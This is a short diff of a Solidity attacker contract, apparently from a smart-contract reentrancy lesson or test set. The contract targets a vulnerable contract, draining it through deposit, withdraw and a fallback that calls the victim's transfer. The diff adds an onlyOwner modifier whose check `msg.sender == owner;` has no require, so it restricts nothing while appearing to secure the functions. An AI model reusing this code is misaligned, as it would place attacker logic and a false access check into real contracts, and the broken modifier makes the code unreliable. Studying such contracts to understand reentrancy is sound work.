@@ -11,19 +11,20 @@ contract ReentrancyAttacker {
     vulnerable = ReentrancyVulnerable(_vulnerableAddr);
   }
 
-  function setOwner(address payable _owner) public {
-    owner = _owner;
+  modifier onlyOwner {
+    msg.sender == owner;
+    _;
   }
 
   function () payable external {
     vulnerable.transfer(owner, msg.value);
   }
 
-  function deposit() payable public {
+  function deposit() payable public onlyOwner {
     vulnerable.deposit.value(msg.value)();
   }
 
-  function withdraw() public {
+  function withdraw() public onlyOwner {
     vulnerable.withdraw();
     require(owner.send(address(this).balance));
   }
